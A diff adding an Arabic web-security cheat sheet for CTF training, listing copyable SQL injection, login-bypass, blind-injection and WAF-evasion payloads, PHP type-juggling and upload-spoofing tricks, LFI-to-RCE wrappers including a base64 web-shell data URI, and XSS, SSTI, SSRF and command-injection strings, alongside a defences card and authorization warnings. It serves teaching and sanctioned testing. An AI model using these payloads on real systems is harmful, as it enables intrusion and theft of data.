@@ -505,6 +505,160 @@
       <div class="muted small-t">استخدم هذه الأدوات فقط على مواقع المسابقة أو المواقع المصرّح لك باختبارها، وأزل الشهادات بعد الانتهاء.</div>
     </div>
   </div>
+  <div class="card websec-intro">
+    <h2>🛡️ أمن الويب — الاستغلال (SQLi و PHP)</h2>
+    <p class="muted">مرجع تعليمي لتحديات CTF والاختبار المصرّح به فقط. لا تستخدم هذه الحمولات على أي نظام لا تملك إذناً صريحاً ومكتوباً باختباره. اضغط أي حمولة لنسخها.</p>
+  </div>
+  <div class="grid2 websec">
+    <div class="card">
+      <h3>💉 حقن SQL — الكشف</h3>
+      <p class="muted small-t">أدخل رموزاً تكسر بناء الاستعلام وراقب تغيّر السلوك أو ظهور خطأ.</p>
+      <table>
+        <tr><td><code class="cp">'</code></td><td>اقتباس مفرد — كسر الاستعلام</td></tr>
+        <tr><td><code class="cp">"</code></td><td>اقتباس مزدوج</td></tr>
+        <tr><td><code class="cp">' OR '1'='1</code></td><td>شرط دائم الصحة</td></tr>
+        <tr><td><code class="cp">' AND '1'='2</code></td><td>شرط دائم الخطأ (قارن النتيجتين)</td></tr>
+        <tr><td><code class="cp">1' AND SLEEP(3)-- -</code></td><td>تأخّر = الحقن يعمل (أعمى)</td></tr>
+      </table>
+      <div class="muted small-t">التعليقات لإنهاء بقية الاستعلام: <code class="cp">-- -</code> · <code class="cp">#</code> · <code class="cp">/* */</code> (المسافة بعد <code>--</code> مهمة في MySQL).</div>
+    </div>
+    <div class="card">
+      <h3>🔑 تجاوز تسجيل الدخول</h3>
+      <p class="muted small-t">في خانة اسم المستخدم (وأحياناً كلمة السر):</p>
+      <table>
+        <tr><td><code class="cp">admin'-- -</code></td><td>دخول كـ admin دون كلمة سر</td></tr>
+        <tr><td><code class="cp">admin'#</code></td><td>نفس الفكرة (MySQL)</td></tr>
+        <tr><td><code class="cp">' OR 1=1-- -</code></td><td>أول مستخدم في الجدول</td></tr>
+        <tr><td><code class="cp">' OR '1'='1'-- -</code></td><td>صيغة بالاقتباسات</td></tr>
+        <tr><td><code class="cp">') OR ('1'='1'-- -</code></td><td>عندما يكون الاستعلام داخل أقواس</td></tr>
+        <tr><td><code class="cp">admin'/*</code> … <code class="cp">*/-- -</code></td><td>تعليق موزّع على الحقلين</td></tr>
+      </table>
+    </div>
+    <div class="card">
+      <h3>🧩 UNION — استخراج البيانات</h3>
+      <ol class="steps small-t">
+        <li>عدد الأعمدة: <code class="cp">' ORDER BY 1-- -</code> وزِد الرقم حتى يظهر خطأ، أو:</li>
+        <li><code class="cp">' UNION SELECT NULL-- -</code> وأضف <code>NULL</code> حتى تنجح.</li>
+        <li>اعثر على عمود ظاهر: <code class="cp">' UNION SELECT 1,2,3-- -</code></li>
+        <li>اسحب البيانات في الأعمدة الظاهرة:</li>
+      </ol>
+      <pre class="cp">' UNION SELECT username,password FROM users-- -</pre>
+      <div class="muted small-t">بصمة قاعدة البيانات: <code class="cp">@@version</code> · <code class="cp">version()</code> · <code class="cp">database()</code> · <code class="cp">user()</code>. دمج عدة صفوف في MySQL: <code class="cp">group_concat(username,0x3a,password)</code>.</div>
+    </div>
+    <div class="card">
+      <h3>🗂️ استخراج المخطط (MySQL)</h3>
+      <pre class="cp">' UNION SELECT table_name,2 FROM information_schema.tables WHERE table_schema=database()-- -</pre>
+      <pre class="cp">' UNION SELECT column_name,2 FROM information_schema.columns WHERE table_name='users'-- -</pre>
+      <pre class="cp">' UNION SELECT group_concat(table_name),2 FROM information_schema.tables-- -</pre>
+      <div class="muted small-t">قراءة ملف (بصلاحيات): <code class="cp">' UNION SELECT LOAD_FILE('/etc/passwd'),2-- -</code></div>
+    </div>
+    <div class="card">
+      <h3>🕶️ الحقن الأعمى (Blind)</h3>
+      <p class="muted small-t">لا تظهر البيانات مباشرة — استنتجها حرفاً حرفاً.</p>
+      <table>
+        <tr><td class="muted">منطقي</td><td><code class="cp">' AND SUBSTRING(database(),1,1)='a'-- -</code></td></tr>
+        <tr><td class="muted">زمني MySQL</td><td><code class="cp">' AND IF(1=1,SLEEP(3),0)-- -</code></td></tr>
+        <tr><td class="muted">خطأ MySQL</td><td><code class="cp">' AND extractvalue(1,concat(0x7e,database()))-- -</code></td></tr>
+        <tr><td class="muted">زمني Postgres</td><td><code class="cp">'||pg_sleep(3)-- -</code></td></tr>
+        <tr><td class="muted">زمني MSSQL</td><td><code class="cp">'; WAITFOR DELAY '0:0:3'-- -</code></td></tr>
+      </table>
+      <div class="muted small-t">للأتمتة: <code>sqlmap -u URL --batch --dbs</code> (على تحديات CTF أو أنظمتك فقط).</div>
+    </div>
+    <div class="card">
+      <h3>🗃️ اختلافات اللهجات + تجاوز الفلاتر</h3>
+      <table>
+        <tr><th>قاعدة</th><th>تعليق</th><th>نص فرعي</th><th>تأخير</th></tr>
+        <tr><td>MySQL</td><td class="mono">-- - / #</td><td class="mono">SUBSTRING</td><td class="mono">SLEEP()</td></tr>
+        <tr><td>Postgres</td><td class="mono">-- -</td><td class="mono">SUBSTR</td><td class="mono">pg_sleep()</td></tr>
+        <tr><td>MSSQL</td><td class="mono">-- -</td><td class="mono">SUBSTRING</td><td class="mono">WAITFOR</td></tr>
+        <tr><td>SQLite</td><td class="mono">-- -</td><td class="mono">substr</td><td class="mono">randomblob</td></tr>
+        <tr><td>Oracle</td><td class="mono">-- -</td><td class="mono">SUBSTR</td><td class="mono">dbms_lock</td></tr>
+      </table>
+      <div class="muted small-t">تجاوز WAF بسيط: تعليقات داخلية <code class="cp">UN/**/ION SE/**/LECT</code> · حالة أحرف <code>UnIoN</code> · <code class="cp">/*!50000UNION*/</code> · ترميز URL مزدوج. Oracle يتطلب <code>FROM dual</code>.</div>
+    </div>
+  </div>
+
+  <div class="card"><h2>🐘 خدع PHP (PHP spoofs / bypass)</h2>
+    <p class="muted small-t">أنماط شائعة في تحديات الويب لأن PHP يتساهل في الأنواع والمقارنات.</p>
+  </div>
+  <div class="grid2 websec">
+    <div class="card">
+      <h3>⚖️ المقارنة الفضفاضة (type juggling)</h3>
+      <table>
+        <tr><td class="mono">"0e123" == "0e456"</td><td>صحيح! كلاهما يُقرأ كـ 0 (أسّي)</td></tr>
+        <tr><td class="mono">0 == "abc"</td><td>صحيح في PHP &lt; 8</td></tr>
+        <tr><td class="mono">"1abc" == 1</td><td>صحيح في PHP &lt; 8</td></tr>
+      </table>
+      <p class="small-t"><b>Magic hashes</b>: كلمات هاشها بصيغة <code>0e[أرقام]</code> فتتساوى مع <code>== </code>:</p>
+      <table>
+        <tr><td><code class="cp">240610708</code></td><td>md5 = 0e462097…</td></tr>
+        <tr><td><code class="cp">QNKCDZO</code></td><td>md5 = 0e830400…</td></tr>
+        <tr><td><code class="cp">10932435112</code></td><td>sha1 = 0e077669…</td></tr>
+      </table>
+      <div class="muted small-t">إن رأيت <code>if (md5($pw) == $hash)</code> فجرّب هذه. الدفاع: استخدم <code>===</code> و <code>hash_equals()</code>.</div>
+    </div>
+    <div class="card">
+      <h3>🧷 تجاوز strcmp / in_array</h3>
+      <p class="small-t">تمرير مصفوفة بدل نص يُربك الدوال:</p>
+      <pre class="cp">password[]=x</pre>
+      <div class="muted small-t"><code>strcmp(array, "...")</code> يعيد <code>NULL</code> (مع تحذير) و <code>NULL == 0</code> صحيح → تجاوز <code>if (strcmp($pw,$real)==0)</code>. ينطبق على <code>strpos</code> و <code>in_array($x,$a)</code> (بلا <code>true</code> ثالث). الدفاع: تحقّق <code>is_string()</code> و <code>===</code>.</div>
+      <h3 style="margin-top:12px">🧮 preg_match (قائمة سوداء)</h3>
+      <div class="muted small-t">فلتر مثل <code>/union.+select/i</code> يُتجاوز بسطر جديد <code class="cp">%0a</code> لأن <code>.</code> لا يطابق السطر الجديد افتراضياً. و <code>/^admin$/</code> قد يُخدع بـ <code>admin%0a&lt;payload&gt;</code> (بدون لاحقة <code>D</code>، <code>$</code> يطابق قبل سطر جديد أخير).</div>
+    </div>
+    <div class="card">
+      <h3>📤 تجاوز رفع الملفات (upload spoofing)</h3>
+      <table>
+        <tr><td class="mono cp">shell.phtml</td><td>امتدادات بديلة تُنفَّذ كـ PHP</td></tr>
+        <tr><td class="mono cp">shell.php5 / .phar / .pht</td><td>بدائل حسب الإعداد</td></tr>
+        <tr><td class="mono cp">shell.php.jpg</td><td>امتداد مزدوج</td></tr>
+        <tr><td class="mono cp">shell.PhP</td><td>تلاعب بحالة الأحرف</td></tr>
+        <tr><td class="mono cp">shell.php%20 / shell.php.</td><td>مسافة/نقطة لاحقة (ويندوز)</td></tr>
+      </table>
+      <p class="small-t"><b>انتحال النوع:</b> أرسل <code>Content-Type: image/png</code> لملف PHP. <b>بايتات سحرية:</b> ابدأ الملف بـ <code class="cp">GIF89a;</code> ثم كود PHP ليمرّ فحص الصورة.</p>
+      <div class="muted small-t">رفع <code>.htaccess</code> يجعل امتداداً مخصصاً يُنفَّذ: <code class="cp">AddType application/x-httpd-php .xyz</code>. الدفاع: قائمة بيضاء للامتدادات، إعادة ترميز الصور، تخزين خارج جذر الويب بأسماء عشوائية.</div>
+    </div>
+    <div class="card">
+      <h3>🧪 الأغلفة و LFI → RCE</h3>
+      <p class="small-t">قراءة مصدر صفحة عبر فلتر base64 (كلاسيكي لاستخراج الكود/الأعلام):</p>
+      <pre class="cp">php://filter/convert.base64-encode/resource=index.php</pre>
+      <table>
+        <tr><td class="mono cp">php://input</td><td>ضع كود PHP في جسم POST عند include</td></tr>
+        <tr><td class="mono cp">data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUW2NdKTs=</td><td>تنفيذ عبر data</td></tr>
+        <tr><td class="mono cp">expect://id</td><td>تنفيذ أوامر (إن فُعّل)</td></tr>
+        <tr><td class="mono cp">../../../../etc/passwd</td><td>عبور المسار (LFI)</td></tr>
+      </table>
+      <div class="muted small-t">تسميم السجلّات و <code>/proc/self/environ</code> لتحويل LFI إلى تنفيذ. سلاسل فلاتر PHP لاستخراج الأعلام: ابحث عن "php_filter_chain_generator". الدفاع: <code>allow_url_include=Off</code>، قائمة بيضاء للمسارات، <code>basename()</code>.</div>
+    </div>
+  </div>
+
+  <div class="grid2 websec">
+    <div class="card">
+      <h3>🧰 ثغرات ويب أخرى شائعة في CTF</h3>
+      <table>
+        <tr><td class="muted">XSS</td><td><code class="cp">&lt;script&gt;alert(document.cookie)&lt;/script&gt;</code></td></tr>
+        <tr><td class="muted">XSS سمة</td><td><code class="cp">"&gt;&lt;img src=x onerror=alert(1)&gt;</code></td></tr>
+        <tr><td class="muted">حقن أوامر</td><td><code class="cp">; id</code> · <code class="cp">| id</code> · <code class="cp">$(id)</code> · <code class="cp">`id`</code></td></tr>
+        <tr><td class="muted">SSTI</td><td><code class="cp">{{7*7}}</code> · <code class="cp">${7*7}</code> · <code class="cp">&lt;%= 7*7 %&gt;</code></td></tr>
+        <tr><td class="muted">عبور المسار</td><td><code class="cp">....//....//etc/passwd</code></td></tr>
+        <tr><td class="muted">SSRF</td><td><code class="cp">http://127.0.0.1/</code> · <code class="cp">http://169.254.169.254/</code></td></tr>
+        <tr><td class="muted">IDOR</td><td>غيّر <code>?id=1</code> إلى <code>?id=2</code> …</td></tr>
+        <tr><td class="muted">NoSQL</td><td><code class="cp">{"$ne":null}</code> · <code class="cp">user[$ne]=0</code></td></tr>
+      </table>
+    </div>
+    <div class="card websec-def">
+      <h3>✅ الدفاعات (علّمها لطلابك)</h3>
+      <ul class="small-t">
+        <li><b>SQLi:</b> استعلامات مُعاملة (prepared statements / parameterized) دائماً — لا بناء استعلام بدمج نصوص. أقل صلاحية للحساب.</li>
+        <li><b>PHP juggling:</b> استخدم <code>===</code> و <code>hash_equals()</code>، وتحقّق من الأنواع (<code>is_string</code>).</li>
+        <li><b>الرفع:</b> قائمة بيضاء للامتداد والنوع، أعد ترميز الصور، خزّن خارج جذر الويب بأسماء عشوائية، امنع التنفيذ في مجلد الرفع.</li>
+        <li><b>LFI/RCE:</b> <code>allow_url_include=Off</code>، قوائم بيضاء للمسارات، لا تُضمّن مدخلات المستخدم.</li>
+        <li><b>XSS:</b> ترميز المخرجات حسب السياق، <code>Content-Security-Policy</code>, <code>HttpOnly</code> للكوكيز.</li>
+        <li><b>عام:</b> تحقّق من المدخلات، جدار حماية تطبيقات (WAF)، تحديثات، ومبدأ أقل صلاحية.</li>
+      </ul>
+      <div class="muted small-t">مراجع موسّعة (عامة وتعليمية): PortSwigger Web Security Academy · OWASP Testing Guide · PayloadsAllTheThings · HackTricks.</div>
+    </div>
+  </div>
+
   <div class="card">
     <h3>🧰 أدوات مجانية تستحق الحفظ (بدون ذكاء اصطناعي)</h3>
     <ul>
